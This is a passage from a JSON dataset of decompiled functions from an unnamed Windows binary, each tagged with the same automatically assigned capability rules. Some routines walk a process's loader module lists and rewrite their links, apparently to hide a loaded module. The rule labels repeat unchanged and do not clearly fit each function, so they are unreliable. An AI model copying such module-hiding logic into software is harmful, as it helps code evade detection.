        "decompiled_code": "\nint32_t fcn.00056e40(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    if (*0x800ce963 == '\\0') {\n        fcn.000349b0(0x800cdae8);\n        iVar1 = fcn.000344b0(0x800cdae4);\n        if (iVar1 == 0) {\n            var_4h = -1;\n        }\n        else {\n            fcn.000326e0(0x800cdad8);\n            *0x800da998 = fcn.000356f0(0x960);\n            if (*0x800da998 == 0) {\n                var_4h = 0x21590004;\n            }\n            else {\n                fcn.00078bfa(*0x800da998, 0, 0x960);\n                *0x800cdaec = 0;\n                *0x800cdaf0 = 0;\n                iVar1 = fcn.0001ace0(0x800cdadc, 0x80097510, 0);\n                if (iVar1 == 0) {\n                    *0x800ce963 = '\\x01';\n                    var_4h = 0;\n                }\n                else {\n                    *0x800ce963 = '\\0';\n                    var_4h = fcn.00035ae0();\n                }\n                for (var_8h = 0; var_8h < 4; var_8h = var_8h + 1) {\n                    uVar2 = fcn.000298c0(*(var_8h * 0x3c + -0x7ff35460), 0);\n                    *(var_8h * 0x3c + -0x7ff3545c) = uVar2;\n                    if (*(var_8h * 0x3c + -0x7ff3545c) == 0) {\n                        *(var_8h * 0x3c + -0x7ff3545c) = 0xffffffff;\n                    }\n                    uVar2 = fcn.000298c0(*(var_8h * 0x3c + -0x7ff35458), 0);\n                    *(var_8h * 0x3c + -0x7ff35454) = uVar2;\n                    if (*(var_8h * 0x3c + -0x7ff35454) == 0) {\n                        *(var_8h * 0x3c + -0x7ff35454) = 0xffffffff;\n                    }\n                    iVar1 = fcn.000298c0(*(var_8h * 0x3c + -0x7ff35468), 0);\n                    if (iVar1 != 0) {\n                        (**(var_8h * 0x3c + -0x7ff3543c))(var_8h);\n                    }\n                }\n            }\n            if (var_4h != 0) {\n                fcn.000349e0(0x800cdae8);\n                fcn.00034540(0x800cdae4);\n                fcn.000357f0(*0x800da998);\n                *0x800da998 = 0;\n            }\n        }\n    }\n    else {\n        var_4h = 0x21590006;\n    }\n    return var_4h;\n}\n",
        "token_count": 770
    },
    "00057010": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid fcn.00057010(void)\n\n{\n    uint32_t var_8h;\n    uint var_1h;\n    \n    if (*0x800ce963 != '\\0') {\n        *0x800ce963 = '\\0';\n        *0x800ccf13 = 1;\n        fcn.00034570(0x800cdae4);\n        fcn.00037760(0x800cdadc, 0);\n        fcn.00037710(0x800cdadc);\n        fcn.00034540(0x800cdae4);\n        for (var_8h = 0; var_8h < 4; var_8h = var_8h + 1) {\n            if (*(var_8h * 0x3c + -0x7ff35464) != 0) {\n                (**(var_8h * 0x3c + -0x7ff35438))(var_8h, 1);\n            }\n        }\n        fcn.000349e0(0x800cdae8);\n        (**0x8005100c)();\n        for (var_8h = 0; var_8h < 100; var_8h = var_8h + 1) {\n            if (*(*0x800da998 + var_8h * 0x18) != 0) {\n                fcn.000357f0(*(*0x800da998 + var_8h * 0x18));\n            }\n        }\n        (**0x80051010)();\n        fcn.000357f0(*0x800da998);\n        *0x800da998 = 0;\n    }\n    return;\n}\n",
        "token_count": 388
    },
    "00057130": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00057130(int32_t arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    if (*0x800ce963 == '\\0') {\n        var_4h = 0xffffffff;\n    }\n    else {\n        fcn.00034a10(0x800cdae8);\n        uVar1 = fcn.000298c0(*(arg_8h * 0x3c + -0x7ff35460), 0);\n        *(arg_8h * 0x3c + -0x7ff3545c) = uVar1;\n        if (*(arg_8h * 0x3c + -0x7ff3545c) == 0) {\n            *(arg_8h * 0x3c + -0x7ff3545c) = 0xffffffff;\n        }\n        uVar1 = fcn.000298c0(*(arg_8h * 0x3c + -0x7ff35458), 0);\n        *(arg_8h * 0x3c + -0x7ff35454) = uVar1;\n        if (*(arg_8h * 0x3c + -0x7ff35454) == 0) {\n            *(arg_8h * 0x3c + -0x7ff35454) = 0xffffffff;\n        }\n        if (*(arg_8h * 0x3c + -0x7ff35464) == 0) {\n            uVar1 = fcn.00035b50(*(arg_8h * 0x3c + -0x7ff35430), 0x80055738);\n            *(arg_8h * 0x3c + -0x7ff35434) = uVar1;\n            if (*(arg_8h * 0x3c + -0x7ff35434) == 0) {\n                var_4h = fcn.00035ae0();\n            }\n            else {\n                iVar2 = arg_8h * 0x3c;\n                *(iVar2 + -0x7ff35450) = 0;\n                *(iVar2 + -0x7ff3544c) = 0;\n                *(iVar2 + -0x7ff35448) = 0;\n                *(iVar2 + -0x7ff35444) = 0;\n                *(iVar2 + -0x7ff35440) = 0;\n                uVar1 = fcn.00035de0(*(arg_8h * 0x3c + -0x7ff35434));\n                uVar1 = fcn.00035df0(uVar1);\n                *(arg_8h * 0x3c + -0x7ff35440) = uVar1;\n                fcn.00029900(*(arg_8h * 0x3c + -0x7ff35468), 1);\n                *(arg_8h * 0x3c + -0x7ff35464) = 1;\n                var_4h = 0;\n            }\n        }\n        else {\n            var_4h = 0x21590006;\n        }\n        fcn.00034a80(0x800cdae8);\n    }\n    return var_4h;\n}\n",
        "token_count": 744
    },
    "000572b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000572b0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    if (*0x800ce963 == '\\0') {\n        uVar1 = 0x21590006;\n    }\n    else {\n        fcn.00034a10(0x800cdae8);\n        if (*(arg_8h * 0x3c + -0x7ff35464) != 0) {\n            fcn.00036000(*(arg_8h * 0x3c + -0x7ff35434));\n            if (arg_ch == 0) {\n                fcn.00029900(*(arg_8h * 0x3c + -0x7ff35468), 0);\n            }\n            *(arg_8h * 0x3c + -0x7ff35464) = 0;\n        }\n        fcn.00034a80(0x800cdae8);\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 235
    },
    "00057380": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00057380(uint arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    uint var_20h;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (*(arg_18h * 0x3c + -0x7ff35464) != 0) {\n        var_8h = arg_18h;\n        (**0x80051104)(&var_10h);\n        iVar1 = fcn.000356f0(arg_ch + arg_14h);\n        if (iVar1 == 0) {\n            fcn.00037400(arg_18h * 0x3c + -0x7ff35448);\n        }\n        else {\n            fcn.00078be8(iVar1, arg_8h, arg_ch);\n            fcn.00078be8(iVar1 + arg_ch, arg_10h, arg_14h);\n            (**0x8005100c)();\n            uVar3 = (*0x800cdaec + 1) % 100;\n            if (uVar3 == *0x800cdaf0) {\n                if (arg_18h == 0) {\n                    fcn.00037400(0x800cabb8);\n                }\n            }\n            else {\n                piVar2 = *0x800cdaec * 0x18 + *0x800da998;\n                *piVar2 = iVar1;\n                piVar2[1] = arg_ch + arg_14h;\n                piVar2[2] = var_10h;\n                piVar2[3] = var_ch;\n                piVar2[4] = var_8h;\n                piVar2[5] = var_4h;\n                *0x800cdaec = uVar3;\n            }\n            (**0x80051010)();\n            fcn.00034570(0x800cdae4);\n        }\n    }\n    return;\n}\n",
        "token_count": 507
    },
    "00057510": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.00057510(void)\n\n{\n    uint arg_8h;\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_1ch = fcn.00026ff0();\n    while (fcn.000345a0(0x800cdae4, 60000),  *0x800ccf13 == '\\0') {\n        while ((**0x8005100c)(),  *0x800cdaec != *0x800cdaf0) {\n            puVar2 = *0x800cdaf0 * 0x18 + *0x800da998;\n            arg_8h = *puVar2;\n            var_14h = puVar2[1];\n            var_10h = puVar2[2];\n            var_ch = puVar2[3];\n            var_8h = puVar2[4];\n            var_4h = puVar2[5];\n            puVar2 = *0x800cdaf0 * 0x18 + *0x800da998;\n            *puVar2 = 0;\n            puVar2[1] = 0;\n            puVar2[2] = 0;\n            puVar2[3] = 0;\n            puVar2[4] = 0;\n            puVar2[5] = 0;\n            *0x800cdaf0 = (*0x800cdaf0 + 1) % 100;\n            (**0x80051010)();\n            if (*(var_8h * 0x3c + -0x7ff35464) != 0) {\n                if ((*(var_8h * 0x3c + -0x7ff35444) < *(var_8h * 0x3c + -0x7ff35454)) &&\n                   (*(var_8h * 0x3c + -0x7ff35440) < *(var_8h * 0x3c + -0x7ff3545c))) {\n                    fcn.00034a10(0x800cdae8);\n                    if ((var_8h == 0) || (var_8h == 3)) {\n                        fcn.00035d00(&var_14h, 4, 1, *(var_8h * 0x3c + -0x7ff35434));\n                        fcn.00035d00(&var_10h, 8, 1, *(var_8h * 0x3c + -0x7ff35434));\n                        if (var_8h == 0) {\n                            *0x800cabbc = *0x800cabbc + 1;\n                        }\n                    }\n                    fcn.00035d00(arg_8h, var_14h, 1, *(var_8h * 0x3c + -0x7ff35434));\n                    *(var_8h * 0x3c + -0x7ff35440) = *(var_8h * 0x3c + -0x7ff35440) + var_14h;\n                    fcn.00034a80(0x800cdae8);\n                }\n                else {\n                    (**(var_8h * 0x3c + -0x7ff35438))(var_8h, 1);\n                }\n            }\n            fcn.000357f0(arg_8h);\n        }\n        (**0x80051010)();\n        iVar1 = fcn.00026ff0();\n        if (59999 < iVar1 - var_1ch) {\n            fcn.00040e80();\n            var_1ch = fcn.00026ff0();\n        }\n    }\n    return 0;\n}\n",
        "token_count": 881
    },
    "000579d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.000579d0(uint arg_8h, int32_t arg_ch, uint arg_10h, uint *arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    *arg_14h = 0;\n    if (*0x800ce963 == '\\0') {\n        var_4h = 0x21590006;\n    }\n    else {\n        iVar1 = fcn.00020a80(arg_10h, 0x58, 3, &var_8h, 4);\n        if (iVar1 == 0) {\n            if (arg_ch == 0x838) {\n                var_8h = 0;\n            }\n            else if (arg_ch == 0x853) {\n                var_8h = 2;\n            }\n            else {\n                if (arg_ch != 0x857) {\n                    return 0x21590001;\n                }\n                var_8h = 1;\n            }\n        }\n        if (*(var_8h * 0x3c + -0x7ff35464) == 0) {\n            var_4h = 0x21590006;\n        }\n        else {\n            var_4h = (**(var_8h * 0x3c + -0x7ff35438))(var_8h, 0);\n            if (var_4h == 0) {\n                var_4h = fcn.000577f0(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch);\n            }\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 405
    },
    "00057ab0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00057ab0(uint noname_0, uint noname_1, uint arg_10h, uint *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t var_54h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    uint var_44h;\n    uint *var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint *var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint *var_14h;\n    uint var_10h;\n    uint *var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    *arg_14h = 0;\n    if (*0x800ce963 == '\\0') {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        iVar2 = fcn.00020a80(arg_10h, 0x58, 3, &var_4ch, 4);\n        if (iVar2 == 0) {\n            var_4ch = 0;\n        }\n        *arg_14h = 3;\n        iVar2 = fcn.00020a80(arg_10h, 0x1d, 2, &var_48h, 4);\n        if (iVar2 != 0) {\n            if (var_48h == 0) {\n                var_50h = -1;\n            }\n            else {\n                var_50h = var_48h;\n            }\n            *(var_4ch * 0x3c + -0x7ff3545c) = var_50h;\n        }\n        iVar2 = fcn.00020a80(arg_10h, 0x1e, 2, &var_48h, 4);\n        if (iVar2 != 0) {\n            if (var_48h == 0) {\n                var_54h = -1;\n            }\n            else {\n                var_54h = var_48h;\n            }\n            *(var_4ch * 0x3c + -0x7ff35454) = var_54h;\n        }\n        fcn.00029900(*(var_4ch * 0x3c + -0x7ff35460), *(var_4ch * 0x3c + -0x7ff3545c));\n        if (*(var_4ch * 0x3c + -0x7ff35458) != 0) {\n            fcn.00029900(*(var_4ch * 0x3c + -0x7ff35458), *(var_4ch * 0x3c + -0x7ff35454));\n        }\n        var_10h = 2;\n        var_ch = &var_24h;\n        var_24h = 0x2f;\n        var_20h = 2;\n        var_1ch = 0x30;\n        var_18h = 2;\n        var_14h = &var_44h;\n        var_8h = 1;\n        var_4h = &var_14h;\n        var_38h = 0;\n        var_28h = 0;\n        var_40h = &var_3ch;\n        var_44h = 4;\n        var_3ch = *(var_4ch * 0x3c + -0x7ff3545c);\n        var_30h = &var_2ch;\n        var_34h = 4;\n        var_2ch = *(var_4ch * 0x3c + -0x7ff35454);\n        uVar1 = fcn.0002f2c0(&var_10h, arg_18h, arg_1ch);\n    }\n    return uVar1;\n}\n",
        "token_count": 916
    },
    "00057d40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00057d40(int32_t *arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    if (arg_10h == 0) {\n        fcn.000357f0(*arg_8h);\n        *arg_8h = 0;\n        uVar1 = 0;\n    }\n    else {\n        iVar2 = fcn.000356c0(arg_10h);\n        if (iVar2 == 0) {\n            uVar1 = 0xffffffff;\n        }\n        else {\n            if (arg_10h < arg_ch) {\n                var_8h = arg_10h;\n            }\n            else {\n                var_8h = arg_ch;\n            }\n            fcn.00078be8(iVar2, *arg_8h, var_8h);\n            fcn.000357f0(*arg_8h);\n            *arg_8h = iVar2;\n            uVar1 = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 259
    },
    "00057dd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00057dd0(uint arg_8h, int32_t *arg_ch)\n\n{\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = *arg_ch;\n    var_4h = arg_ch[2];\n    var_ch = fcn.0005a680(arg_8h, var_8h + 8, 0, &var_4h, 4);\n    if (var_ch == 0) {\n        var_ch = fcn.0005a680(arg_8h, var_4h, 0, &var_8h, 4);\n    }\n    return var_ch == 0;\n}\n",
        "token_count": 162
    },
    "00057e40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00057e40(uint arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = arg_ch;\n    var_ch = fcn.0005a640(arg_8h, arg_ch + 8, 0, &var_4h, 4);\n    if ((((var_ch == 0) && (var_ch = fcn.0005a680(arg_8h, arg_10h, 0, &var_8h, 4),  var_ch == 0)) &&\n        (var_ch = fcn.0005a680(arg_8h, arg_10h + 8, 0, &var_4h, 4),  var_ch == 0)) &&\n       (var_ch = fcn.0005a680(arg_8h, var_4h, 0, &arg_10h, 4),  var_ch == 0)) {\n        var_ch = fcn.0005a680(arg_8h, var_8h + 8, 0, &arg_10h, 4);\n    }\n    return var_ch == 0;\n}\n",
        "token_count": 284
    },
    "00057f10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00057f10(uint arg_8h, int32_t *arg_ch)\n\n{\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = *arg_ch;\n    var_4h = arg_ch[1];\n    var_ch = fcn.0005a680(arg_8h, var_8h + 4, 0, &var_4h, 4);\n    if (var_ch == 0) {\n        var_ch = fcn.0005a680(arg_8h, var_4h, 0, &var_8h, 4);\n    }\n    return var_ch == 0;\n}\n",
        "token_count": 162
    },
    "00057f80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00057f80(uint arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_ch = arg_ch;\n    var_4h = arg_10h;\n    var_10h = fcn.0005a640(arg_8h, arg_ch + 4, 0, &var_8h, 4);\n    if ((((var_10h == 0) && (var_10h = fcn.0005a680(arg_8h, arg_10h, 0, &var_ch, 4),  var_10h == 0)) &&\n        (var_10h = fcn.0005a680(arg_8h, arg_10h + 4, 0, &var_8h, 4),  var_10h == 0)) &&\n       (var_10h = fcn.0005a680(arg_8h, var_8h, 0, &var_4h, 4),  var_10h == 0)) {\n        var_10h = fcn.0005a680(arg_8h, var_ch + 4, 0, &var_4h, 4);\n    }\n    return var_10h == 0;\n}\n",
        "token_count": 318
    },
    "00058050": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00058050(uint param_1, int32_t param_2, int32_t *param_3)\n\n{\n    uint *in_FS_OFFSET;\n    uint var_18h;\n    uint var_8h;\n    int32_t var_ch;\n    int32_t *var_10h;\n    uint var_228h;\n    uint var_224h;\n    uint var_220h;\n    int32_t var_21ch;\n    uint var_218h;\n    uint var_214h;\n    int32_t var_200h;\n    uint var_1f0h;\n    int32_t var_1e4h;\n    uint var_1e0h;\n    uint var_1d8h;\n    int32_t var_1d0h;\n    int32_t var_1cch;\n    int32_t var_1c8h;\n    int32_t var_1a4h;\n    int32_t var_1a0h;\n    int32_t var_174h;\n    int32_t var_16ch;\n    int32_t var_168h;\n    int32_t var_164h;\n    uint var_160h;\n    int32_t var_140h;\n    uint var_120h;\n    int32_t var_108h;\n    uint var_100h;\n    uint var_f0h;\n    uint32_t var_e0h;\n    uint32_t var_dch;\n    uint32_t var_d8h;\n    uint32_t var_d4h;\n    int32_t var_d0h;\n    int32_t var_cch;\n    uint32_t var_90h;\n    uint32_t var_8ch;\n    uint32_t var_88h;\n    uint32_t var_84h;\n    int32_t var_38h;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uchar *var_19h;\n    uint var_10h_2;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x800b8d80;\n    uStack16 = 0x800b8bf4;\n    var_10h_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h_2;\n    *0x10 = &stack0xfffffdc8;\n    var_20h = 0;\n    if (var_10h == NULL) {\n        var_24h = 0x21590067;\n        goto code_r0x000584e3;\n    }\n    *var_10h = 0;\n    var_24h = fcn.0005a7d0(&var_20h, 0x438, var_8h);\n    if ((var_24h == 0) && (var_24h = fcn.0005a540(var_20h, &var_19h),  var_24h == 0)) {\n        var_19h._0_1_ = '\\x01' - (var_19h != '\\0');\n        var_24h = fcn.0005a130(var_20h, &var_28h);\n        if (var_24h == 0) {\n            var_4h = 0;\n            if (var_19h == '\\0') {\n                var_24h = fcn.0005a640(var_20h, var_28h, 0, &var_1f0h, 0x10);\n                if (var_24h == 0) {\n                    if (var_1e4h == 0) {\n                        var_24h = -1;\n                        var_4h = 0xffffffff;\n                    }\n                    else {\n                        var_24h = fcn.0005a640(var_20h, var_1e4h, 0, &var_214h, 0x24);\n                        if (var_24h == 0) {\n                            var_21ch = var_200h;\n                            while (var_21ch != var_1e4h + 0x14) {\n                                var_24h = fcn.0005a640(var_20h, var_21ch, 0, &var_174h, 8);\n                                if (var_24h != 0) {\n                                    var_4h = 0xffffffff;\n                                    goto code_r0x000584d1;\n                                }\n                                var_24h = fcn.0005a640(var_20h, var_21ch + -8, 0, &var_1e0h, 0x48);\n                                if (var_24h != 0) {\n                                    var_4h = 0xffffffff;\n                                    goto code_r0x000584d1;\n                                }\n                                if (var_1c8h == var_ch) {\n                                    fcn.00057f10(var_20h, &var_1e0h);\n                                    fcn.00057f10(var_20h, &var_1d8h);\n                                    if ((var_1d0h != 0) && (var_1cch != 0)) {\n                                        fcn.00057f10(var_20h, &var_1d0h);\n                                    }\n                                    if ((var_1a0h != 0) && (var_1a4h != 0)) {\n                                        fcn.00057f10(var_20h, &var_1a4h);\n                                    }\n                                    *var_10h = var_21ch + -8;\n                                    break;\n                                }\n                                var_21ch = var_174h;\n                            }\n                            goto code_r0x000584a0;\n                        }\n                        var_4h = 0xffffffff;\n                    }\n                }\n                else {\n                    var_4h = 0xffffffff;\n                }\n            }\n            else {\n                var_24h = fcn.0005a640(var_20h, var_28h, 0, &var_120h, 0x20);\n                if (var_24h == 0) {\n                    var_16ch = var_108h;\n                    if (var_108h == 0) {\n                        var_24h = -1;\n                        var_4h = 0xffffffff;\n                    }\n                    else {\n                        var_24h = fcn.0005a640(var_20h, var_108h, 0, &var_160h, 0x40);\n                        if (var_24h == 0) {\n                            var_168h = var_140h;\n                            while (var_168h != var_16ch + 0x20) {\n                                var_24h = fcn.0005a640(var_20h, var_168h, 0, &var_38h, 0x10);\n                                if (var_24h != 0) {\n                                    var_4h = 0xffffffff;\n                                    goto code_r0x000584d1;\n                                }\n                                var_164h = var_168h + -0x10;\n                                var_24h = fcn.0005a640(var_20h, var_164h, 0, &var_100h, 0x88);\n                                if (var_24h != 0) {\n                                    var_4h = 0xffffffff;\n                                    goto code_r0x000584d1;\n                                }\n                                if ((var_d0h == var_ch) && (var_cch == 0)) {\n                                    fcn.00057dd0(var_20h, &var_100h);\n                                    fcn.00057dd0(var_20h, &var_f0h);\n                                    if (((var_e0h | var_dch) != 0) && ((var_d8h | var_d4h) != 0)) {\n                                        fcn.00057dd0(var_20h, &var_e0h);\n                                    }\n                                    if (((var_88h | var_84h) != 0) && ((var_90h | var_8ch) != 0)) {\n                                        fcn.00057dd0(var_20h, &var_90h);\n                                    }\n                                    *var_10h = var_164h;\n                                    break;\n                                }\n                                var_168h = var_38h;\n                            }\ncode_r0x000584a0:\n                            var_24h = (*var_10h != 0) - 1;\n                            var_4h = 0xffffffff;\n                        }\n                        else {\n                            var_4h = 0xffffffff;\n                        }\n                    }\n                }\n                else {\n                    var_4h = 0xffffffff;\n                }\n            }\n        }\n    }\ncode_r0x000584d1:\n    if (var_20h != 0) {\n        fcn.000789b4(var_20h);\n    }\ncode_r0x000584e3:\n    *in_FS_OFFSET = var_10h_2;\n    return var_24h;\n}\n",
        "token_count": 1989
    },
    "00058500": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00058500(uint param_1, int32_t param_2, int32_t *param_3)\n\n{\n    uint *in_FS_OFFSET;\n    uint var_18h;\n    uint var_8h;\n    int32_t var_ch;\n    int32_t *var_10h;\n    uint var_220h;\n    int32_t var_21ch;\n    uint var_218h;\n    uint var_214h;\n    int32_t var_200h;\n    uint var_1f0h;\n    int32_t var_1e4h;\n    uint var_1e0h;\n    int32_t var_1c8h;\n    uint var_1a8h;\n    int32_t var_174h;\n    int32_t var_16ch;\n    int32_t var_168h;\n    int32_t var_164h;\n    uint var_160h;\n    int32_t var_140h;\n    uint var_120h;\n    int32_t var_108h;\n    uint var_100h;\n    int32_t var_d0h;\n    uint var_94h;\n    int32_t var_38h;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uchar *var_19h;\n    uint var_10h_2;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x800b8d70;\n    uStack16 = 0x800b8bf4;\n    var_10h_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h_2;\n    *0x10 = &stack0xfffffdd0;\n    var_20h = 0;\n    if (var_ch == 0) {\n        var_24h = 0x21590066;\n        goto code_r0x000588b1;\n    }\n    if (var_10h == NULL) {\n        var_24h = 0x21590067;\n        goto code_r0x000588b1;\n    }\n    var_24h = fcn.0005a7d0(&var_20h, 0x410, var_8h);\n    if ((var_24h == 0) && (var_24h = fcn.0005a540(var_20h, &var_19h),  var_24h == 0)) {\n        var_19h._0_1_ = '\\x01' - (var_19h != '\\0');\n        var_24h = fcn.0005a130(var_20h, &var_28h);\n        if (var_24h == 0) {\n            var_4h = 0;\n            if (var_19h == '\\0') {\n                var_24h = fcn.0005a640(var_20h, var_28h, 0, &var_1f0h, 0x10);\n                if (var_24h == 0) {\n                    if (var_1e4h == 0) {\n                        var_24h = -1;\n                        var_4h = 0xffffffff;\n                    }\n                    else {\n                        var_24h = fcn.0005a640(var_20h, var_1e4h, 0, &var_214h, 0x24);\n                        if (var_24h == 0) {\n                            var_21ch = var_200h;\n                            while (var_21ch != var_1e4h + 0x14) {\n                                var_24h = fcn.0005a640(var_20h, var_21ch, 0, &var_174h, 8);\n                                if (var_24h != 0) {\n                                    var_4h = 0xffffffff;\n                                    goto code_r0x0005889f;\n                                }\n                                var_24h = fcn.0005a640(var_20h, var_21ch + -8, 0, &var_1e0h, 0x48);\n                                if (var_24h != 0) {\n                                    var_4h = 0xffffffff;\n                                    goto code_r0x0005889f;\n                                }\n                                if (var_1c8h == var_ch) {\n                                    *var_10h = var_1a8h;\n                                    var_24h = 0;\n                                    var_4h = 0xffffffff;\n                                    goto code_r0x0005889f;\n                                }\n                                var_21ch = var_174h;\n                            }\n                            goto code_r0x0005886f;\n                        }\n                        var_4h = 0xffffffff;\n                    }\n                }\n                else {\n                    var_4h = 0xffffffff;\n                }\n            }\n            else {\n                var_24h = fcn.0005a640(var_20h, var_28h, 0, &var_120h, 0x20);\n                if (var_24h == 0) {\n                    var_16ch = var_108h;\n                    if (var_108h == 0) {\n                        var_24h = -1;\n                        var_4h = 0xffffffff;\n                    }\n                    else {\n                        var_24h = fcn.0005a640(var_20h, var_108h, 0, &var_160h, 0x40);\n                        if (var_24h == 0) {\n                            var_168h = var_140h;\n                            while (var_168h != var_16ch + 